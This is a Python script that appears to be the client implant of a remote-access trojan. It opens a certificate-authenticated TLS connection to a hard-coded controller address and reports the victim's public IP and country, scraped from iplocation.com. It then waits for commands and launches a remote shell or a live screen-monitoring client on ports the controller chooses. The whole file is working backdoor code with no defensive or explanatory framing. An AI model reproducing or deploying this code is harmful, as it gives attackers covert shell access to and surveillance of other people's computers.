#!/usr/bin/python3
import socket
import ssl
import requests
from lxml import html
import subprocess
import os
import time

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003


class Server_Side():

    def __init__(self):
        self.host_addr = '10.0.0.9'
        self.host_port = 8082
        self.dir_path = os.path.dirname(os.path.realpath(__file__)) + "\\..\\"
        self.server_sni_hostname = 'example.com'
        self.server_cert = self.dir_path + 'main_stuff\\server.crt'
        self.client_cert = self.dir_path + 'main_stuff\\client.crt'
        self.client_key = self.dir_path + 'main_stuff\\client.key'
        self.conn = self.Get_Secure_Connection()
        self.ipv4 = self.Get_Local_Ip()


    def Get_Secure_Connection(self):
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.server_cert)
        context.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn = context.wrap_socket(s, server_side=False, server_hostname=self.server_sni_hostname)
        conn.connect((self.host_addr, self.host_port))
        print("SSL established. Peer: {}".format(conn.getpeercert()))
        return conn

    def Send_First_Data(self):
        req = requests.get(url="https://iplocation.com")
        tree = html.fromstring(req.content)
        ip = tree.xpath('//b[@class="ip"]/text()')
        country = tree.xpath('//span[@class="country_name"]/text()')
        data = "INFO: Client IP: " + ip[0] + " Client Country " + country[0]
        print (data)
        self.conn.send(data.encode())



    def Get_Local_Ip(self):
        return self.conn.getsockname()[0]


    def tryPort(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = False
        try:
            sock.bind((self.ipv4, port))
            result = True
        except:
            print("Port is in use")
        sock.close()
        return result

    def Get_Data(self):
        c = ""
        while True:
            c = self.conn.recv(1024)
            if c:
                break
        return c.decode()

    #def Send_Current_Dir(self):
        #self.conn.send(self.dir_path[:-4].encode())

    def Set_Port(self, port):
        while(self.tryPort(port) == False):
            self.conn.send("PORT_ERROR".encode())
            port = int(self.Get_Data().split(" ")[1])
        self.conn.send("PORT_SUCCESS".encode())
        return port

    def Panel(self):
        self.Send_First_Data()
        #while True:
            #flag = self.conn.recv(1024).decode()
            #if flag:
                #break
        #self.Send_Current_Dir()
        while True:
            c = self.Get_Data()
            c = c.split(" ")
            cmd = c[0]
            port = c[1]
            port = self.Set_Port(int(port))
            if(cmd == "Shell"):
                self.Shell(port)
                print("Exited from the shell")
            elif(cmd == "Live"):
                self.Live_Screen(port)

    def Live_Screen(self, port):
        msg = "Im in the LS!"
        time.sleep(2)
        self.conn.send("Opened".encode())
        os.system(self.dir_path + "Python37-32\\python.exe " + self.dir_path + "new_monitor\\mon_client.py " + str(port))
        print(msg)


    def Shell(self, port):
        msg = "Im in the shell!"
        time.sleep(2)
        self.conn.send("Opened".encode())
        os.system(self.dir_path + "Python37-32\\python.exe " + self.dir_path + "Shell\shell_client.py " + str(port))
        print(msg)
        # create the socket object








c = Server_Side()
c.Panel()

